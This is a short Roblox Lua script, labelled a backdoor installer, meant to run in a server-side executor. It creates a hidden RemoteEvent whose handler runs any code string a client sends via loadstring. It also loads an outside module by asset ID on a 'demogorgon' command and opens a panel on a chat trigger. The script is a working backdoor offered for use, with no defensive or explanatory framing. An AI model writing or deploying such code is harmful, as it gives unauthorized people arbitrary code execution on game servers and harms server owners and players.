-- === BACKDOOR INSTALLER - RUN THIS IN SERVER-SIDE EXECUTOR ===
print("Installing Server Backdoor...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Create hidden Remote for server execution
local BackdoorRemote = ReplicatedStorage:FindFirstChild("BackdoorRemote") or Instance.new("RemoteEvent")
BackdoorRemote.Name = "BackdoorRemote"
BackdoorRemote.Parent = ReplicatedStorage

-- Server-side handler
BackdoorRemote.OnServerEvent:Connect(function(player, code)
    if code and type(code) == "string" then
        print(player.Name .. " executed code via backdoor")
        local success, err = pcall(loadstring(code))
        if not success then
            warn("Backdoor Error: " .. err)
        end
    end
end)

-- Auto-load Demogorgon command
BackdoorRemote.OnServerEvent:Connect(function(player, cmd, arg)
    if cmd == "demogorgon" then
        require(90079465185110).load(arg or player.Name)
    end
end)

print("✅ Backdoor Installed Successfully! (BackdoorRemote created)")

-- Optional: Give yourself admin
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        if msg == ";backdoor" then
            BackdoorRemote:FireClient(plr, "Panel Opened")
        end
    end)
end)
